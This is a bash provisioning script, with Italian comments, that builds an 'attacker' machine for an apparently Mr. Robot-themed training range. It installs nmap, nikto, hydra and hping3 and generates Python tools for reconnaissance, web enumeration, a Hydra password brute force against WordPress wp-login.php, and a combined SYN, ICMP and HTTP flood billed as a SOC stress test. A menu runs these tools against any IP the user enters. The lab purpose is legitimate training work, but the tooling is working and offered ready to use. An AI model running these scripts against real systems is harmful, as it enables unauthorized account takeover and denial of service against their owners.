#!/bin/bash

# --- AUTO ELEVATION TO ROOT ---
if [[ $EUID -ne 0 ]]; then
   echo "Questo script deve essere eseguito come root. Riavvio con sudo..."
   sudo "$0" "$@"
   exit $?
fi
# ------------------------------

exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1

echo "[*] In attesa della connettività internet..."
until ping -c1 8.8.8.8 &>/dev/null; do :; done
echo "[+] Internet OK!"

echo "[*] In attesa che dpkg/apt siano liberi..."
while fuser /var/lib/dpkg/lock >/dev/null 2>&1 ; do
    sleep 1
done
while fuser /var/lib/apt/lists/lock >/dev/null 2>&1 ; do
    sleep 1
done
echo "[+] APT lock libero. Inizio installazione."

# --- LOG DI BOOTSTRAP ---
LOG_FILE="/var/log/attacker_bootstrap.log"
echo "[*] Inizio bootstrap macchina Attaccante (foothold + sensor tester)..." > $LOG_FILE

# 1. INSTALLAZIONE DIPENDENZE E TOOL OFFENSIVI
echo "[*] Installazione pacchetti..." >> $LOG_FILE
apt-get update
# Aggiunto python3-venv per gestire l'ambiente virtuale
apt-get install -y python3 python3-pip python3-venv nmap nikto hydra curl wget git hping3

# 2. SETUP DIRECTORY E VIRTUAL ENVIRONMENT
ATTACK_DIR="/opt/mr-robot-attacks"
echo "[*] Configurazione ambiente in $ATTACK_DIR..." >> $LOG_FILE

mkdir -p $ATTACK_DIR
mkdir -p $ATTACK_DIR/output
mkdir -p $ATTACK_DIR/wordlists

# --- CREAZIONE REQUIREMENTS.TXT ---
cat <<EOF > $ATTACK_DIR/requirements.txt
requests
termcolor
EOF

# --- CREAZIONE VENV ---
echo "[*] Creazione Python Virtual Environment..." >> $LOG_FILE
python3 -m venv $ATTACK_DIR/venv

# --- INSTALLAZIONE DIPENDENZE NEL VENV ---
echo "[*] Installazione librerie Python nel venv..." >> $LOG_FILE
$ATTACK_DIR/venv/bin/pip install -r $ATTACK_DIR/requirements.txt

# 3. CREAZIONE WORDLIST (Simulazione fsocity.dic)
cat << 'EOF' > $ATTACK_DIR/wordlists/fsocity.dic
admin
user
test
password
mrrobot
elliot
fsocity
123456
qwerty
football
dragon
baseball
EOF

# -------------------------------------------------------------------------
# 4. CREAZIONE SCRIPTS PYTHON
# -------------------------------------------------------------------------

# --- SCRIPT 1: RECONNAISSANCE (NMAP) ---
cat << 'EOF' > $ATTACK_DIR/01_recon.py
#!/usr/bin/env python3
import subprocess
import sys
from termcolor import colored

def run_nmap(target_ip):
    print(colored(f"[*] Avvio scansione NMAP su {target_ip}...", "green"))
    cmd = f"nmap -sV -sC -oN /opt/mr-robot-attacks/output/nmap_scan.txt {target_ip}"
    
    try:
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            output = process.stdout.readline()
            if output == b'' and process.poll() is not None:
                break
            if output:
                print(output.decode().strip())
        print(colored("[+] Scansione Nmap completata. Output salvato.", "green"))
    except Exception as e:
        print(colored(f"[-] Errore: {e}", "red"))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        target = input("Inserisci IP Vittima: ")
    else:
        target = sys.argv[1]
    run_nmap(target)
EOF

# --- SCRIPT 2: WEB ENUMERATION (Robots & Nikto) ---
cat << 'EOF' > $ATTACK_DIR/02_web_enum.py
#!/usr/bin/env python3
import requests
import subprocess
import sys
from termcolor import colored

def check_robots(target_url):
    print(colored(f"[*] Controllo robots.txt su {target_url}...", "yellow"))
    try:
        r = requests.get(f"{target_url}/robots.txt", timeout=5)
        if r.status_code == 200:
            print(colored("[+] robots.txt TROVATO! Contenuto:", "green"))
            print(r.text)
            if "fsocity.dic" in r.text:
                print(colored("[!] INDIZIO RILEVATO: fsocity.dic menzionato!", "red", attrs=['bold']))
        else:
            print(colored("[-] robots.txt non trovato.", "red"))
    except Exception as e:
        print(f"Errore connessione: {e}")

def run_nikto(target_ip):
    print(colored(f"\n[*] Avvio scansione Nikto su {target_ip}...", "yellow"))
    cmd = f"nikto -h {target_ip} -o /opt/mr-robot-attacks/output/nikto_scan.txt"
    subprocess.run(cmd, shell=True)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        ip = input("Inserisci IP Vittima: ")
    else:
        ip = sys.argv[1]
    
    url = f"http://{ip}"
    check_robots(url)
    run_nikto(ip)
EOF

# --- SCRIPT 3: BRUTE FORCE (Hydra) ---
cat << 'EOF' > $ATTACK_DIR/03_bruteforce.py
#!/usr/bin/env python3
import subprocess
import sys
import os
from termcolor import colored

def run_hydra_wp(target_ip):
    print(colored("[*] Preparazione attacco Hydra...", "red"))
    wordlist = "/opt/mr-robot-attacks/wordlists/fsocity.dic"
    print(colored(f"[*] Attaccando http://{target_ip}/wp-login.php...", "yellow"))
    
    cmd = f"hydra -l elliot -P {wordlist} {target_ip} http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username\" -V"
    subprocess.run(cmd, shell=True)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        ip = input("Inserisci IP Vittima: ")
    else:
        ip = sys.argv[1]
    run_hydra_wp(ip)
EOF

# --- SCRIPT 4: SOC STRESS TEST (TRAFFIC FLOOD) ---
cat << 'EOF' > $ATTACK_DIR/04_chaos_traffic.py
#!/usr/bin/env python3
import subprocess
import sys
import time
import threading
import requests
import random
from termcolor import colored

def http_noise(target_ip, duration):
    """Genera traffico HTTP rumoroso per riempire i log access.log"""
    print(colored("[Thread HTTP] Inizio generazione errori 404 e User-Agent fake...", "cyan"))
    end_time = time.time() + duration
    user_agents = [
        "Mozilla/5.0 (EvilScanner/1.0)",
        "SQLMap/1.5",
        "Nikto/2.1.0",
        "BlackHat/Generic"
    ]
    paths = ["/admin", "/backup", "/db.sql", "/passwords.txt", "/wp-config.php.bak", "/shell.php"]
    
    count = 0
    while time.time() < end_time:
        try:
            path = random.choice(paths)
            ua = random.choice(user_agents)
            url = f"http://{target_ip}{path}"
            requests.get(url, headers={"User-Agent": ua}, timeout=1)
            count += 1
        except:
            pass
    print(colored(f"[Thread HTTP] Inviate {count} richieste malevole.", "cyan"))

def network_flood(target_ip, duration):
    """Usa hping3 per generare traffico SYN flood (visibile sui grafici di rete)"""
    print(colored("[Thread NET] Avvio hping3 SYN Flood (Port 80)...", "magenta"))
    # -S: SYN, -p 80: port 80, --flood: invia il più veloce possibile
    # Usiamo timeout per fermarlo dopo 'duration' secondi
    cmd = f"timeout {duration} hping3 -S -p 80 --flood {target_ip}"
    
    # Sopprimiamo output per pulizia
    subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    print(colored("[Thread NET] Flood terminato.", "magenta"))

def icmp_ping_flood(target_ip, duration):
    """Genera traffico ICMP costante"""
    print(colored("[Thread ICMP] Avvio Ping Flood...", "blue"))
    cmd = f"timeout {duration} hping3 -1 --flood {target_ip}"
    subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    print(colored("[Thread ICMP] Ping Flood terminato.", "blue"))

def main():
    if len(sys.argv) < 2:
        target_ip = input("Inserisci IP Vittima: ")
    else:
        target_ip = sys.argv[1]

    print(colored("!!! ATTENZIONE: STRESS TEST SOC INIZIATO !!!", "red", attrs=['bold', 'blink']))
    print(colored("Questo attacco genererà traffico elevato per 30 secondi.", "yellow"))
    
    duration = 30 # Durata in secondi
    
    # Avvio thread paralleli
    t1 = threading.Thread(target=http_noise, args=(target_ip, duration))
    t2 = threading.Thread(target=network_flood, args=(target_ip, duration))
    t3 = threading.Thread(target=icmp_ping_flood, args=(target_ip, duration))
    
    t1.start()
    t2.start()
    t3.start()
    
    # Progress bar finta
    for i in range(duration):
        sys.stdout.write(f"\rAttacco in corso... {duration-i}s rimanenti")
        sys.stdout.flush()
        time.sleep(1)
    
    t1.join()
    t2.join()
    t3.join()
    
    print(colored("\n\n[+] STRESS TEST COMPLETATO.", "green", attrs=['bold']))
    print("Controlla la dashboard del SOC per vedere i picchi di traffico.")

if __name__ == "__main__":
    main()
EOF

# --- MENU LAUNCHER PRINCIPALE ---
cat << 'EOF' > $ATTACK_DIR/attack_menu.py
#!/usr/bin/env python3
import os
import sys
from termcolor import colored

def clear_screen():
    os.system('clear')

def print_banner():
    print(colored("""
    ╔══════════════════════════════════════════╗
    ║      CYBERGUARD ARENA TOOLS v2.0         ║
    ║      Automated offensive tooling         ║
    ╚══════════════════════════════════════════╝
    """, "cyan", attrs=['bold']))

def main():
    target_ip = ""
    
    while True:
        clear_screen()
        print_banner()
        if target_ip:
            print(colored(f"Target attuale: {target_ip}", "green"))
        else:
            print(colored("Target non impostato", "red"))
        
        print("\n1. Imposta IP Target")
        print("2. [RECON] Nmap Scan (Silent-ish)")
        print("3. [ENUM] Web & Robots Check")
        print("4. [ATTACK] Brute Force Login")
        print(colored("5. [NOISE] SOC Stress Test (Flood/DDOS Sim)", "red"))
        print("0. Esci")
        
        choice = input("\nSeleziona opzione: ")
        
        if choice == '1':
            target_ip = input("Inserisci IP Target: ")
        
        elif choice == '2':
            if not target_ip: 
                input("Prima imposta il target! (Invio per continuare)")
                continue
            # FIX: Uso interprete del venv
            os.system(f"/opt/mr-robot-attacks/venv/bin/python3 /opt/mr-robot-attacks/01_recon.py {target_ip}")
            input("\nPremere Invio per tornare al menu...")
            
        elif choice == '3':
            if not target_ip:
                input("Prima imposta il target!")
                continue
            # FIX: Uso interprete del venv
            os.system(f"/opt/mr-robot-attacks/venv/bin/python3 /opt/mr-robot-attacks/02_web_enum.py {target_ip}")
            input("\nPremere Invio per tornare al menu...")

        elif choice == '4':
            if not target_ip:
                input("Prima imposta il target!")
                continue
            # FIX: Uso interprete del venv
            os.system(f"/opt/mr-robot-attacks/venv/bin/python3 /opt/mr-robot-attacks/03_bruteforce.py {target_ip}")
            input("\nPremere Invio per tornare al menu...")
            
        elif choice == '5':
            if not target_ip:
                input("Prima imposta il target!")
                continue
            # FIX: Uso interprete del venv
            os.system(f"/opt/mr-robot-attacks/venv/bin/python3 /opt/mr-robot-attacks/04_chaos_traffic.py {target_ip}")
            input("\nPremere Invio per tornare al menu...")
            
        elif choice == '0':
            sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nUscita...")
EOF

# 5. PERMESSI E CONFIGURAZIONE FINALE
chmod +x $ATTACK_DIR/*.py
chmod +x $ATTACK_DIR/wordlists/*.dic

# FIX ALIAS: Usa direttamente l'interprete Python del virtual environment
# Questo permette di lanciare 'mr-robot' da qualsiasi shell (anche non root)
# ma esegue lo script con privilegi sudo usando le librerie del venv.
ALIAS_CMD="alias mr-robot='sudo /opt/mr-robot-attacks/venv/bin/python3 /opt/mr-robot-attacks/attack_menu.py'"

echo "$ALIAS_CMD" >> /root/.bashrc
echo "$ALIAS_CMD" >> /home/ubuntu/.bashrc
# Per Kali Linux user (se esiste)
if [ -d "/home/kali" ]; then
    echo "$ALIAS_CMD" >> /home/kali/.bashrc
fi

# Check finale
echo "[*] Bootstrap terminato." >> $LOG_FILE